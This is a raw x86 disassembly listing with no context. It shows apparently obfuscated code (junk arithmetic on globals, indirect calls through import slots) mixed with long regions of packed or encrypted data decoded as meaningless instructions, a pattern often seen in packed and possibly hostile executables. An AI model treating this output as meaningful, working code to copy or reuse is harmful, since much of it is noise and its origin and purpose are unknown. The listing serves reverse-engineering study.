  42055b:	mov    esi,DWORD PTR ds:0x42835f
  420561:	or     DWORD PTR ds:0x428363,esi
  420567:	mov    esi,DWORD PTR ds:0x428187
  42056d:	mov    edx,DWORD PTR ds:0x42831f
  420573:	sub    esi,edx
  420575:	and    esi,DWORD PTR [esi+edx*1]
  420578:	adc    DWORD PTR ds:0x42835f,edx
  42057e:	mov    DWORD PTR [ebp-0xdc],0x699c
  420588:	mov    DWORD PTR [ebp-0xd8],0x1
  420592:	adc    esi,eax
  420594:	mov    DWORD PTR [ebp-0x24],0x7901
  42059b:	cmp    DWORD PTR ds:0x428153,0x0
  4205a2:	not    esi
  4205a4:	mov    DWORD PTR ds:0x428377,0x3e17
  4205ae:	jmp    0x420635
  4205b3:	mov    DWORD PTR ds:0x428213,0x2222
  4205bd:	not    DWORD PTR ds:0x428223
  4205c3:	cmp    DWORD PTR ds:0x428153,0x0
  4205ca:	jge    0x42060e
  4205d0:	push   0x185b
  4205d5:	push   0x42837f
  4205da:	push   0x89e7
  4205df:	push   DWORD PTR [ebp-0x20]
  4205e2:	call   DWORD PTR ds:0x428e2c
  4205e8:	xor    edx,DWORD PTR ds:0x428227
  4205ee:	mov    ecx,DWORD PTR ds:0x42820f
  4205f4:	or     DWORD PTR ds:0x42813f,ecx
  4205fa:	mov    ecx,DWORD PTR ds:0x4282b3
  420600:	mov    ecx,DWORD PTR [ecx]
  420602:	and    DWORD PTR ds:0x42837b,ecx
  420608:	and    esi,0x3af9
  42060e:	and    ecx,0x78a0
  420614:	mov    edx,DWORD PTR ds:0x42825b
  42061a:	xor    DWORD PTR ds:0x428247,edx
  420620:	movzx  ecx,WORD PTR ds:0x428233
  420627:	and    ecx,DWORD PTR ds:0x42836b
  42062d:	mov    DWORD PTR ds:0x428233,ecx
  420633:	sub    ecx,edx
  420635:	mov    DWORD PTR [ebp-0xc0],0x3e2c
  42063f:	xor    DWORD PTR ds:0x42837f,0x275e
  420649:	mov    DWORD PTR [ebp-0x78],0x37f2
  420650:	sbb    ecx,0x6514
  420656:	mov    DWORD PTR [ebp-0x10],0x62ba
  42065d:	jmp    0x4209b9
  420662:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420663:	(bad)  
  420664:	mov    ?,ebx
  420666:	push   0x3a
  420668:	and    eax,0xe3891e9e
  42066d:	stos   BYTE PTR es:[edi],al
  42066e:	pop    ecx
  42066f:	fisttp QWORD PTR [ecx+0x6a]
  420672:	lods   al,BYTE PTR ds:[esi]
  420673:	sbb    eax,0x12a31816
  420678:	sbb    BYTE PTR [eax],bl
  42067a:	mov    edi,0xb126cc4a
  42067f:	sbb    edx,ebx
  420681:	popa   
  420682:	mov    BYTE PTR [ecx],dl
  420684:	test   ecx,esp
  420686:	or     ecx,DWORD PTR [ebp+0x117e8344]
  42068c:	mov    ?,edx
  42068e:	stos   BYTE PTR es:[edi],al
  42068f:	adc    eax,DWORD PTR [edi-0x46]
  420692:	add    bh,BYTE PTR [eax-0x4443164]
  420698:	jp     0x420673
  42069a:	cwde   
  42069b:	das    
  42069c:	and    al,0x4c
  42069e:	inc    esp
  42069f:	add    ebx,DWORD PTR [edi]
  4206a1:	les    ebp,FWORD PTR [edi+0x77e3133b]
  4206a7:	and    eax,0x2a15e652
  4206ac:	cli    
  4206ad:	jle    0x420702
  4206af:	mov    esi,0x6133e4b1
  4206b4:	in     al,dx
  4206b5:	push   cs
  4206b6:	add    al,0x83
  4206b8:	and    DWORD PTR [ebp-0x697040d7],ebp
  4206be:	xchg   ecx,eax
  4206bf:	xchg   ecx,eax
  4206c0:	jmp    DWORD PTR [edi-0x50]
  4206c3:	sbb    al,0x2c
  4206c5:	out    0x58,al
  4206c7:	loope  0x4206a9
  4206c9:	leave  
  4206ca:	fidiv  WORD PTR [edx-0x4f895821]
  4206d0:	scas   al,BYTE PTR es:[edi]
  4206d1:	daa    
  4206d2:	dec    edi
  4206d3:	mov    eax,ds:0xd3990bba
  4206d8:	mov    al,ds:0x5041711a
  4206dd:	and    eax,0x6998096
  4206e2:	xor    cl,0x29
  4206e5:	cld    
  4206e6:	cmc    
  4206e7:	add    DWORD PTR [ecx],edx
  4206e9:	repz pop es
  4206eb:	shl    BYTE PTR [ebp-0xf],1
  4206ee:	daa    
  4206ef:	ds dec ebp
  4206f1:	imul   edx,eax,0x8c82c7f1
  4206f7:	add    al,0x1a
  4206f9:	add    cl,bh
  4206fb:	stos   DWORD PTR es:[edi],eax
  4206fc:	cmp    BYTE PTR [edi+0x3631b56],bl
  420702:	sub    BYTE PTR [esi+0x4a],dl
  420705:	aaa    
  420706:	popa   
  420707:	test   eax,0xd4d5ee54
  42070c:	mov    dh,0xf1
  42070e:	clc    
  42070f:	fld    QWORD PTR [ecx]
  420711:	and    al,BYTE PTR [esi]
  420713:	pushw  0xcd3
  420717:	leave  
  420718:	push   0x5f
  42071a:	and    ah,BYTE PTR [edx+0x31]
  42071d:	or     ah,BYTE PTR ss:[eax]
  420720:	cmp    esi,ebp
  420722:	aaa    
  420723:	jmp    DWORD PTR [ebp+0x306c4b13]
  420729:	clc    
  42072a:	sbb    al,0x3b
  42072c:	and    BYTE PTR [ecx-0x19],ch
  42072f:	push   ds
  420730:	dec    ecx
  420731:	xor    BYTE PTR [edx],dh
  420733:	sbb    ebp,DWORD PTR [ecx+0x26b1cfc9]
  420739:	jbe    0x4206be
  42073b:	call   0xd77b68ea
  420740:	pop    es
  420741:	xchg   bl,al
  420743:	dec    esi
  420744:	dec    eax
  420745:	xor    esi,DWORD PTR [edi]
  420747:	cmc    
  420748:	es xchg dh,ch
  42074b:	cmc    
  42074c:	(bad)  
  42074d:	jns    0x4207b0
  42074f:	or     bl,BYTE PTR gs:[edi+0x7d]
  420753:	push   0x1d4d1b41
  420758:	or     ah,BYTE PTR [ecx]
  42075a:	xor    eax,ecx
  42075c:	or     al,0xcf
  42075e:	jle    0x4206e8
  420760:	push   es
  420761:	xor    bh,cl
  420763:	in     eax,0xad
  420765:	test   eax,0x9cc7d379
  42076a:	arpl   bx,bp
  42076c:	(bad)  
  42076d:	jl     0x420713
  42076f:	xchg   ebx,esp
  420771:	sbb    DWORD PTR [eax+0x7ea37fa8],0x8bc63baa
  42077b:	retf   0x536
  42077e:	leave  
  42077f:	sbb    ecx,DWORD PTR [edx+0x22]
  420782:	mov    esp,0x4a90cdf3
  420787:	shl    DWORD PTR [ecx],cl
  420789:	mov    ebp,0xad522796
  42078e:	and    ah,bh
  420790:	mov    ebp,0x1f4d5e3f
  420795:	mov    edi,0xc9bebf2a
  42079a:	hlt    
  42079b:	mov    dh,0x82
  42079d:	dec    DWORD PTR [edi-0x3b784f0b]
  4207a3:	pop    ebx
  4207a4:	shl    bh,0x86
  4207a7:	push   ss
  4207a8:	lahf   
  4207a9:	adc    BYTE PTR [ebp+eax*1-0x25],cl
  4207ad:	dec    edi
  4207ae:	out    dx,eax
  4207af:	fsubr  st(2),st
  4207b1:	sti    
  4207b2:	fwait
  4207b3:	arpl   WORD PTR [ebx-0x30],di
  4207b6:	scas   al,BYTE PTR es:[edi]
  4207b7:	adc    DWORD PTR [esi+0x4d087037],0xffffff8b
  4207be:	sbb    bh,cl
  4207c0:	adc    al,0xe0
  4207c2:	mov    dh,0xf5
  4207c4:	aaa    
  4207c5:	dec    edx
  4207c6:	add    al,bl
  4207c8:	pop    eax
  4207c9:	jl     0x420797
  4207cb:	inc    ebx
  4207cc:	ins    BYTE PTR es:[edi],dx
  4207cd:	inc    esp
  4207ce:	sub    cl,BYTE PTR [edi-0x31c4984b]
  4207d4:	adc    DWORD PTR [esi-0xd],esi
  4207d7:	neg    DWORD PTR [esi-0x7d]
  4207da:	int    0x3c
  4207dc:	pop    edx
  4207dd:	dec    esp
  4207de:	retf   
  4207df:	jge    0x42079d
  4207e1:	jle    0x4207af
  4207e3:	dec    edx
  4207e4:	in     al,0x2d
  4207e6:	mov    cl,0xf5
  4207e8:	ja     0x42080e
  4207ea:	sub    dl,BYTE PTR [eax]
  4207ec:	pop    esi
  4207ed:	ret    
  4207ee:	push   ebp
  4207ef:	fimul  DWORD PTR [edi+0x18]
  4207f2:	sbb    edi,DWORD PTR [edx]
  4207f4:	push   esi
  4207f5:	xor    eax,0xa1fdb643
  4207fa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4207fb:	cwde   
  4207fc:	add    BYTE PTR [eax-0x10289938],bh
  420802:	and    al,0xa
  420804:	(bad)  
  420806:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420807:	mov    WORD PTR [edi-0x6],es
  42080a:	std    
  42080b:	adc    eax,0x32c203c0
  420810:	aad    0x90
  420812:	and    BYTE PTR [ebx-0x66],cl
  420815:	mov    esi,0xedda18b7
  42081a:	imul   esi,DWORD PTR ds:0x98a19430,0x56
  420821:	pop    esp
  420822:	cmp    eax,0xce69a7a8
  420827:	inc    ebx
  420828:	(bad)  
  420829:	fdivr  DWORD PTR [eax-0x63]
  42082c:	pop    ebx
  42082d:	push   ebp
  42082e:	aad    0x6
  420830:	nop    DWORD PTR [edx-0x173ded92]
  420837:	rol    DWORD PTR [edi-0xe4e2fcf],1
  42083d:	retf   0xe01b
  420840:	add    eax,0xa9acc05c
  420845:	(bad)  
  420846:	icebp  
  420847:	repnz pusha 
  420849:	loop   0x42088b
  42084b:	ins    DWORD PTR es:[edi],dx
  42084c:	pop    ecx
  42084d:	sbb    al,BYTE PTR [ebx]
  42084f:	mov    bl,0x1c
  420851:	fdiv   DWORD PTR [edx-0x11]
  420854:	and    al,0xc0
  420856:	mov    DWORD PTR [eax-0x8],edi
  420859:	popa   
  42085a:	test   dl,0x3c
  42085d:	adc    edx,esp
  42085f:	je     0x42084f
  420861:	inc    ecx
  420862:	aaa    
  420863:	retf   
  420864:	mov    edi,0xe2fea5c5
  420869:	xchg   eax,esp
  42086b:	sar    DWORD PTR [esp+edx*8+0x45],cl
  42086f:	xchg   edx,eax
  420870:	retf   
  420871:	mov    cl,0x7e
  420873:	sub    ebp,DWORD PTR [ebx+0x57]
  420876:	shl    BYTE PTR [ebx],1
  420878:	inc    ebx
  420879:	mov    cl,0xcc
  42087b:	xchg   edi,eax
  42087c:	and    eax,0x24
  42087f:	mul    DWORD PTR [edx]
  420881:	push   esi
  420882:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420883:	aam    0x83
  420885:	xchg   edx,eax
  420886:	mov    bl,0x1d
  420888:	adc    edi,ebx
  42088a:	arpl   si,bp
  42088c:	sub    esp,DWORD PTR [eax-0x4bb78f9e]
  420892:	(bad)  
  420893:	loope  0x4208b3
  420895:	pop    ss
  420896:	push   ss
  420897:	or     eax,0xcb769274
  42089c:	pop    es
  42089d:	or     eax,0x570ca0a0
  4208a2:	or     DWORD PTR [eax-0x4a],esp
  4208a5:	and    BYTE PTR [ebx+0x19352453],bl
  4208ab:	mov    bl,0x8a
  4208ad:	in     al,0xb0
  4208af:	mov    ds:0x5d7af13,al
  4208b4:	lods   eax,DWORD PTR ds:[esi]
  4208b5:	pop    edx
  4208b6:	cmp    eax,0xe4bc947d
  4208bb:	sbb    BYTE PTR [eax],ch
  4208bd:	pop    esi
  4208be:	cwde   
  4208bf:	(bad)  
  4208c0:	loopne 0x4208f5
  4208c2:	and    edi,esi
  4208c4:	mov    ds:0x5f419c6a,eax
  4208c9:	jb     0x4208f8
  4208cb:	push   0x27
  4208cd:	lock (bad) 
  4208cf:	cld    
  4208d0:	pop    esi
  4208d1:	add    al,0xe3
  4208d3:	xchg   BYTE PTR [ecx-0x15],dh
  4208d6:	sub    bh,bh
  4208d8:	pop    esi
  4208d9:	xor    al,0xfb
  4208db:	mov    BYTE PTR [ebx-0x3e],ch
  4208de:	rcr    BYTE PTR [ebp-0x51],1
  4208e1:	les    eax,FWORD PTR ds:0x5812bdd2
  4208e7:	sbb    al,0x79
  4208e9:	loope  0x4208f3
  4208eb:	test   eax,0x5bebf267
  4208f0:	stc    
  4208f1:	sub    eax,DWORD PTR [edi]
  4208f3:	inc    ecx
  4208f4:	test   eax,0xbc7ae6fa
  4208f9:	cwde   
  4208fa:	(bad)  
  4208fb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4208fc:	ja     0x42093d
  4208fe:	sar    BYTE PTR [ebp+0x7b486d21],1
  420904:	inc    eax
  420905:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420906:	shr    BYTE PTR [ebp+0x223edec5],1
  42090c:	inc    DWORD PTR [eax-0x69]
  42090f:	(bad)  
  420910:	xor    al,0x7e
  420912:	outs   dx,DWORD PTR ds:[esi]
  420913:	inc    esi
  420914:	mov    cl,0x56
  420916:	cmp    ah,BYTE PTR [eax]
  420918:	out    dx,eax
  420919:	lods   al,BYTE PTR ds:[esi]
  42091a:	enter  0xb5c1,0xb0
  42091e:	mov    bl,0x69
  420920:	retf   0xabc4
  420923:	ror    ecx,1
  420925:	add    ch,ah
  420927:	mov    ebx,DWORD PTR [ecx]
  420929:	or     edx,edi
  42092b:	mov    ds:0x545b6ab6,al
  420930:	inc    ebp
  420931:	jb     0x4209ae
  420933:	push   edi
  420934:	dec    esi
  420935:	push   esp
  420936:	inc    ecx
  420937:	xchg   edi,eax
  420938:	add    BYTE PTR [ebx-0x5382057f],ah
  42093e:	mov    bh,0xaa
  420940:	pop    eax
  420941:	push   cs
  420942:	mov    dh,ch
  420944:	xor    al,0x46
  420946:	xor    DWORD PTR [ecx+edx*1-0x85f4531],0xc55da46a
  420951:	xchg   edx,eax
  420952:	(bad)  
  420953:	mov    ebp,0x7bb7cf92
  420958:	or     edx,DWORD PTR [ecx+0xa]
  42095b:	cmp    edx,ecx
  42095d:	sub    ah,BYTE PTR [esi-0x1a]
  420960:	dec    esi
  420961:	jnp    0x420964
  420963:	outs   dx,DWORD PTR ds:[esi]
  420964:	mov    edi,DWORD PTR [esi+0x4a]
  420967:	inc    esp
  420968:	fisubr WORD PTR [esi-0x6578d0db]
  42096e:	mov    bh,0xa0
  420970:	(bad)  
  420971:	sub    edi,DWORD PTR [edi-0x7059ed0]
  420977:	test   ebp,0x10a8eced
  42097d:	in     eax,0xba
  42097f:	push   ebx
  420980:	das    
  420981:	inc    eax
  420982:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420983:	out    dx,al
  420984:	test   al,0xa1
  420986:	jb     0x420998
  420988:	sbb    ebp,DWORD PTR [eax+eiz*1]
  42098b:	rcr    esp,0x5e
  42098e:	pusha  
  42098f:	rcr    BYTE PTR [edx-0x3a],0x7e
  420993:	lea    eax,[ebp+0x7fc207df]
  420999:	or     BYTE PTR [ebx-0x2c],bl
  42099c:	popw   ss
  42099e:	not    ebx
  4209a0:	adc    DWORD PTR [edx+ecx*8-0x19],edi
  4209a4:	ja     0x420a25
  4209a6:	xor    al,0xc1
  4209a8:	jb     0x42095a
  4209aa:	in     al,0x92
  4209ac:	xchg   esi,eax
  4209ad:	mov    dl,0x9e
  4209af:	sbb    eax,0x533f0565
  4209b4:	out    0xf8,eax
  4209b6:	add    bh,BYTE PTR [ebx+0xe]
  4209b9:	mov    DWORD PTR [ebp-0x94],0x561c
  4209c3:	mov    DWORD PTR [ebp-0x34],0x58bc
  4209ca:	mov    DWORD PTR [ebp-0x60],0x24c7
  4209d1:	xor    eax,DWORD PTR ds:0x428243
  4209d7:	mov    DWORD PTR [ebp-0x5c],0x7a45
  4209de:	xor    DWORD PTR ds:0x4282df,0x80d
  4209e8:	mov    eax,DWORD PTR [ebp-0x34]
  4209eb:	cmp    DWORD PTR ds:0x428307,0x0
  4209f2:	movzx  esi,WORD PTR ds:0x42821f
  4209f9:	mov    ecx,0x4d8b
  4209fe:	jmp    0x420a54
  420a03:	mov    DWORD PTR ds:0x42814b,0x6139
  420a0d:	mov    DWORD PTR ds:0x428383,0x3849
  420a17:	cmp    DWORD PTR ds:0x428307,0x0
  420a1e:	jne    0x420a40
  420a24:	push   0x53aa
  420a29:	push   0x7054
  420a2e:	call   DWORD PTR ds:0x428e30
  420a34:	sub    DWORD PTR ds:0x4282db,0xc6b
  420a3e:	inc    esi
  420a3f:	inc    edx
  420a40:	and    DWORD PTR ds:0x42820f,edi
  420a46:	and    edx,0x7a3f
  420a4c:	sbb    ecx,ecx
  420a4e:	and    esi,0x2474
  420a54:	mov    ecx,DWORD PTR [ebp-0x60]
  420a57:	adc    edx,DWORD PTR ds:0x42826b
  420a5d:	mov    edx,DWORD PTR [ebp-0x5c]
  420a60:	mov    esi,DWORD PTR ds:0x4282db
  420a66:	sub    DWORD PTR ds:0x4282ef,esi
  420a6c:	and    edx,0x160e
  420a72:	add    esi,DWORD PTR ds:0x42814f
  420a78:	sub    edx,ecx
  420a7a:	cmp    DWORD PTR ds:0x428263,0x0
  420a81:	mov    DWORD PTR ds:0x4282cb,ecx
  420a87:	mov    esi,DWORD PTR ds:0x428303
  420a8d:	jmp    0x420e58
  420a92:	mov    DWORD PTR ds:0x42824b,0x7aef
  420a9c:	cmp    DWORD PTR ds:0x428263,0x0
  420aa3:	je     0x420adc
  420aa9:	push   DWORD PTR [ebp-0x18]
  420aac:	push   0x4599
  420ab1:	push   DWORD PTR [ebp-0x14]
  420ab4:	push   DWORD PTR [ebp-0x10]
  420ab7:	call   DWORD PTR ds:0x428e34
  420abd:	mov    esi,DWORD PTR ds:0x42834b
  420ac3:	or     DWORD PTR ds:0x428273,esi
  420ac9:	xor    ecx,ecx
  420acb:	add    ecx,DWORD PTR ds:0x428183
  420ad1:	mov    esi,DWORD PTR ds:0x4283c7
  420ad7:	sub    ecx,esi
  420ad9:	or     ecx,DWORD PTR [ecx+esi*1]
  420adc:	mov    esi,DWORD PTR ds:0x42814b
  420ae2:	or     DWORD PTR ds:0x428273,esi
  420ae8:	add    ecx,0x4e9b
  420aee:	sbb    esi,ecx
  420af0:	sub    DWORD PTR ds:0x4282d3,ecx
  420af6:	or     esi,0x56f6
  420afc:	jmp    0x420e58
  420b01:	mov    bl,0xa9
  420b03:	lds    esp,FWORD PTR [edx-0x574d5d3d]
  420b09:	stos   BYTE PTR es:[edi],al
  420b0a:	xor    BYTE PTR [edi+0x7c],0x25
  420b0e:	aam    0x97
  420b10:	mov    esp,0x18161736
  420b15:	mov    ds:0x91181812,eax
  420b1a:	jmp    0x420b34
  420b1c:	fisttp WORD PTR [ebp-0x26739f57]
  420b22:	and    BYTE PTR [esi-0x5a25b3c9],0xed
  420b29:	aad    0xac
  420b2b:	jl     0x420b53
  420b2d:	lods   eax,DWORD PTR ds:[esi]
  420b2e:	hlt    
  420b2f:	xchg   esp,eax
  420b30:	inc    eax
  420b31:	or     cl,BYTE PTR [ebp+esi*1-0x1df496cf]
  420b38:	push   esi
  420b39:	sbb    BYTE PTR ds:0xcfeab3d3,bl
  420b3f:	clc    
  420b40:	fxch   st(2)
  420b42:	js     0x420b59
  420b44:	xor    eax,0x42145f22
  420b49:	xchg   edx,eax
  420b4a:	(bad)  [eax+eiz*8-0x4509b73d]
  420b51:	pop    esi
  420b52:	das    
  420b53:	into   
  420b54:	lods   eax,DWORD PTR ds:[esi]
  420b55:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420b56:	sub    al,0x19
  420b58:	xchg   edi,eax
  420b59:	icebp  
  420b5a:	xor    eax,0xe2124bad
  420b5f:	mov    dl,BYTE PTR [esi]
  420b61:	sbb    al,0xf
  420b63:	jge    0x420b76
  420b65:	jno    0x420b14
  420b67:	stc    
  420b68:	outs   dx,BYTE PTR ds:[esi]
  420b69:	jo     0x420bdb
  420b6b:	pop    ecx
  420b6c:	add    eax,DWORD PTR [ebx+edi*1-0x3d]
  420b70:	pop    ebp
  420b71:	jle    0x420b47
  420b73:	rcr    BYTE PTR [ebx-0x268bf53b],1
  420b79:	jnp    0x420b37
  420b7b:	arpl   si,di
  420b7d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420b7e:	and    eax,DWORD PTR [edi-0x40]
  420b81:	stos   DWORD PTR es:[edi],eax
  420b82:	call   0xce0c541a
  420b87:	pop    ebx
  420b88:	call   0x4c4ed45e
  420b8d:	xor    al,0x95
  420b8f:	sub    eax,0xeede150d
  420b94:	ret    
  420b95:	dec    esi
  420b96:	daa    
  420b97:	add    DWORD PTR [ebx],esi
  420b99:	or     eax,0xcfdf1a53
  420b9e:	xchg   edx,eax
  420b9f:	dec    esp
  420ba0:	mov    DWORD PTR [eax-0x1e],eax
  420ba3:	stc    
  420ba4:	retf   
  420ba5:	cmp    eax,0x18b7e981
  420baa:	dec    esp
  420bab:	fs and al,0xea
  420bae:	xor    al,BYTE PTR [esi]
  420bb0:	in     eax,0x12
  420bb2:	adc    ebx,esi
  420bb4:	sbb    ecx,DWORD PTR [esi+edx*2-0x4f]
  420bb8:	mov    al,ds:0xb5fc89e
  420bbd:	sbb    eax,0x753c5ae0
  420bc2:	mov    dh,0xeb
  420bc4:	pop    es
  420bc5:	ret    
  420bc6:	add    al,BYTE PTR [esi]
  420bc8:	mov    eax,ds:0xb9cfda13
  420bcd:	jg     0x420bc3
  420bcf:	jo     0x420b7b
  420bd1:	outs   dx,BYTE PTR ds:[esi]
  420bd2:	pop    es
  420bd3:	stos   BYTE PTR es:[edi],al
  420bd4:	cmp    BYTE PTR [edi-0x6e],dh
  420bd7:	ja     0x420b5c
  420bd9:	mov    bh,0x16
  420bdb:	rcl    DWORD PTR [edx-0x33],1
  420bde:	mov    edx,0xaa83b9b6
  420be3:	xchg   esi,eax
  420be4:	jns    0x420bc3
  420be6:	mov    eax,ds:0x525e32a1
  420beb:	push   cs
  420bec:	sub    al,BYTE PTR [edi+edx*4]
  420bef:	in     eax,0x54
  420bf1:	lds    ecx,FWORD PTR [ebx]
  420bf3:	push   eax
  420bf4:	lods   eax,DWORD PTR ds:[esi]
  420bf5:	xchg   ebp,eax
  420bf6:	and    eax,0xc9e7e4c8
  420bfb:	jge    0x420bdc
  420bfd:	jae    0x420c49
  420bff:	mov    ah,0x1d
  420c01:	sbb    DWORD PTR [eax-0x51],ebx
  420c04:	cmp    al,0x2d
  420c06:	dec    esi
  420c07:	cs or  eax,0x15c9693c
  420c0d:	leave  
  420c0e:	mov    bl,0xc3
  420c10:	ret    0xbc0c
  420c13:	xor    ah,BYTE PTR [edi-0x12]
  420c16:	js     0x420bad
  420c18:	std    
  420c19:	xchg   esi,eax
  420c1a:	mov    al,0x49
  420c1c:	out    dx,al
  420c1d:	cld    
  420c1e:	int3   
  420c1f:	fs cld 
  420c21:	jbe    0x420c13
  420c23:	out    dx,al
  420c24:	push   ecx
  420c25:	xor    DWORD PTR [ebx-0x7d8773e5],edi
  420c2b:	jmp    0xff26:0x6ad1cb27
  420c32:	fdivr  st(0),st
  420c34:	rcr    BYTE PTR [eax+0x5f],cl
  420c37:	pusha  
  420c38:	std    
  420c39:	ss mov bl,0x87
  420c3c:	xlat   BYTE PTR ds:[ebx]
  420c3d:	bound  edx,QWORD PTR ds:0x6d2beb2b
  420c43:	mov    esp,0xeff7d77
  420c48:	in     al,dx
  420c49:	cli    
  420c4a:	imul   edx,DWORD PTR [edi],0x162cdf12
  420c50:	jp     0x420bdd
  420c52:	sub    BYTE PTR [ecx-0x35cac303],al
  420c58:	not    BYTE PTR [edi]
  420c5a:	cli    
  420c5b:	xchg   esp,eax
  420c5c:	div    DWORD PTR [edi+0x23]
  420c5f:	push   ebx
  420c60:	xchg   ebp,eax
  420c61:	sbb    esi,ebx
  420c63:	adc    DWORD PTR [ebx],ebp
  420c65:	neg    BYTE PTR [eax+0x63384e6d]
  420c6b:	lods   eax,DWORD PTR ds:[esi]
  420c6c:	cmp    BYTE PTR ds:0x5800d6b9,ah
  420c72:	jp     0x420cef
  420c74:	sbb    DWORD PTR [esp+eiz*4],edi
  420c77:	fdiv   DWORD PTR [eax+edi*8+0x22d01846]
  420c7e:	or     eax,0x35af049b
  420c83:	in     al,0xb7
  420c85:	jl     0x420ca1
  420c87:	out    0x26,eax
  420c89:	loopne 0x420c12
  420c8b:	dec    eax
  420c8c:	pop    edi
  420c8d:	or     eax,DWORD PTR [eax]
  420c8f:	jno    0x420c52
  420c91:	jne    0x420c13
  420c93:	mov    cs,WORD PTR [ebx]
  420c95:	sbb    eax,0x4dfa9c71
  420c9a:	pop    ecx
  420c9b:	pop    eax
  420c9c:	pop    esi
  420c9d:	or     eax,0xc24c0420
  420ca2:	clc    
  420ca3:	fwait
  420ca4:	add    al,0xc5
  420ca6:	ins    WORD PTR es:[edi],dx
  420ca8:	call   0x73bed650
  420cad:	add    edi,DWORD PTR [eax+0x61b2dae7]
  420cb3:	mov    esp,0xd74013d3
  420cb8:	xchg   BYTE PTR [esi+0x4d],ch
  420cbb:	mov    ebp,0xe52dafae
  420cc0:	rol    al,1
  420cc2:	fst    DWORD PTR [ebx+0x17]
  420cc5:	xor    esp,DWORD PTR [edi+0x36]
  420cc8:	test   BYTE PTR [edi+0x7a],dh
  420ccb:	dec    esp
  420ccc:	ins    DWORD PTR es:[edi],dx
  420ccd:	cdq    
  420cce:	dec    edx
  420ccf:	xor    al,0x39
  420cd1:	repnz push 0x6c4aea6f
  420cd7:	lods   eax,DWORD PTR ds:[esi]
  420cd8:	mov    bh,0x63
  420cda:	inc    edx
  420cdb:	jecxz  0x420c7d
  420cdd:	popa   
  420cde:	fnstenv ds:0x7aefb774
  420ce4:	inc    ecx
  420ce5:	retf   
  420ce6:	mov    es,WORD PTR [esi]
  420ce8:	and    BYTE PTR [eax-0x7e],cl
  420ceb:	mov    esi,0xf21500b8
  420cf0:	test   DWORD PTR ds:0x554592cd,esi
  420cf6:	cmp    edx,DWORD PTR [ebx-0x72f1c63]
  420cfc:	mov    edx,0x25af2bed
  420d01:	ret    0x1c0b
  420d04:	and    BYTE PTR [eax+0x1e68f8a9],bh
  420d0a:	fidivr WORD PTR [esi+0x4b]
  420d0d:	shl    BYTE PTR [ecx+0x5543f776],cl
  420d13:	jae    0x420d51
  420d15:	(bad)  
  420d16:	xlat   BYTE PTR ds:[ebx]
  420d17:	daa    
  420d18:	and    dl,BYTE PTR [edi-0x6a]
  420d1b:	dec    eax
  420d1c:	or     al,0x1c
  420d1e:	or     al,0xad
  420d20:	mov    BYTE PTR [eax+edx*4-0x200b30a2],ah
  420d27:	jl     0x420d69
  420d29:	mov    dl,BYTE PTR [esi+0x3862e3cf]
  420d2f:	xor    BYTE PTR [ebx],cl
  420d31:	inc    ebx
  420d32:	stos   BYTE PTR es:[edi],al
  420d33:	ins    DWORD PTR es:[edi],dx
  420d34:	lahf   
  420d35:	stos   DWORD PTR es:[edi],eax
  420d36:	retf   
  420d37:	mov    ecx,0xe3e45a8
  420d3c:	sar    DWORD PTR [esi-0x69],0x63
  420d40:	sahf   
  420d41:	inc    eax
  420d42:	or     BYTE PTR ds:0xb6528d85,bh
  420d48:	add    al,0xa5
  420d4a:	dec    ecx
  420d4b:	ins    DWORD PTR es:[edi],dx
  420d4c:	xchg   esp,eax
  420d4d:	les    esp,FWORD PTR [edi]
  420d4f:	jge    0x420d05
  420d51:	int    0x64
  420d53:	bound  edi,QWORD PTR [ebp+0x6378165f]
  420d59:	test   eax,0xac38223b
  420d5e:	mov    BYTE PTR [ebp+0x3913a59c],bh
  420d64:	pushf  
  420d65:	jle    0x420d0d
  420d67:	adc    BYTE PTR [ecx+eiz*2],al
  420d6a:	push   ebx
  420d6b:	mov    esi,0xbdfcbf88
  420d70:	xchg   BYTE PTR [esi+0x6545ceb3],ch
  420d76:	icebp  
  420d77:	and    edx,DWORD PTR [ecx]
  420d79:	imul   ebx,edi,0xf
  420d7c:	out    0x7f,al
  420d7e:	outs   dx,DWORD PTR ds:[esi]
  420d7f:	inc    esi
  420d80:	test   bl,bh
  420d82:	inc    esp
  420d83:	xlat   BYTE PTR ds:[ebx]
  420d84:	sbb    edx,DWORD PTR [eax]
  420d86:	punpckldq mm4,mm3
  420d89:	aad    0xdc
  420d8b:	add    al,0x11
  420d8d:	ins    BYTE PTR es:[edi],dx
  420d8e:	or     DWORD PTR [edi-0x25],edi
  420d91:	sbb    edi,DWORD PTR [eax+0x42]
  420d94:	cwde   
  420d95:	stos   DWORD PTR es:[edi],eax
  420d96:	sbb    al,0xcb
  420d98:	arpl   WORD PTR [ecx-0x2e67558a],bx
  420d9e:	pop    eax
  420d9f:	mov    al,ds:0x6d0a9029
  420da4:	out    0xd6,eax
  420da6:	shr    DWORD PTR [edx],1
  420da8:	jbe    0x420d40
  420daa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420dab:	es loope 0x420dc5
  420dae:	adc    BYTE PTR [ebx-0x4b],ah
  420db1:	test   eax,0x58c00eb3
  420db6:	jae    0x420d3c
  420db8:	adc    al,0x9d
  420dba:	push   ecx
  420dbb:	retf   0x7e61
  420dbe:	lods   al,BYTE PTR ds:[esi]
  420dbf:	and    BYTE PTR [eax],0x78
  420dc2:	push   ds
  420dc3:	int    0xec
  420dc5:	fisub  DWORD PTR [edi+edi*2+0x3]
  420dc9:	xor    BYTE PTR [edx+0x79e79dcf],cl
  420dcf:	daa    
  420dd0:	jns    0x420db5
  420dd2:	jbe    0x420dad
  420dd4:	mov    esp,0x55d89421
  420dd9:	ret    
  420dda:	pushf  
  420ddb:	pop    edx
  420ddc:	clc    
  420ddd:	and    edi,eax
  420ddf:	push   ss
  420de0:	into   
  420de1:	push   cs
  420de2:	and    dl,dl
  420de4:	test   al,dl
  420de6:	xlat   BYTE PTR ds:[ebx]
  420de7:	stos   DWORD PTR es:[edi],eax
  420de8:	(bad)  
  420de9:	mov    ecx,0x8aa1e24a
  420dee:	jmp    0xa056:0xb3bac7c7
  420df5:	sub    dl,al
  420df7:	leave  
  420df8:	dec    edx
